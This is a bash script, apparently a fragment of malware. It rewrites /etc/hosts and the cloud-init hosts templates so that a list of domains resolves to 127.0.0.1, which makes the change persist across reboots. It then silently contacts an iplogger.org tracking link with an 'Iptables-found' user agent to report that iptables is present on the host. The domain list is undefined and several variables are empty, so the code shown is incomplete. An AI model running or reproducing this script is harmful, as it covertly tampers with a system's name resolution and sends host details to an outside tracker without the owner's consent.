c1=""
c2=""
c3=""
c4=""
c5=""
f1="/etc/cloud/templates/hosts.redhat.tmpl"
f2="/etc/cloud/templates/hosts.debian.tmpl"
f3="/etc/cloud/templates/hosts.ubuntu.tmpl"
chekhosts() {
        for i in ${h[@]}; do
        sed -i '/'$i'/d' /etc/hosts
        sed -i '1 i\127.0.0.1       '$i'' /etc/hosts
        done
}

chek(){

if [ -f "$f1" ]; then
        for i in ${h[@]}; do
        sed -i '/'$i'/d' $f1
        sed -i '1 i\127.0.0.1       '$i'' $f1
        done
elif [ -f "$f2" ]; then
        for i in ${h[@]}; do
        sed -i '/'$i'/d' $f2
        sed -i '1 i\127.0.0.1       '$i'' $f2
                done
elif [ -f "$f3" ]; then
        for i in ${h[@]}; do
        sed -i '/'$i'/d' $f3
        sed -i '1 i\127.0.0.1       '$i'' $f3
        done
fi
}

chekhosts
chek


d=$(command -v iptables|wc -l)

if [ $d -eq "1" ]; then
        curl -A Iptables-found/1.9 -s https://iplogger.org/389LB3
else
        exit
fi
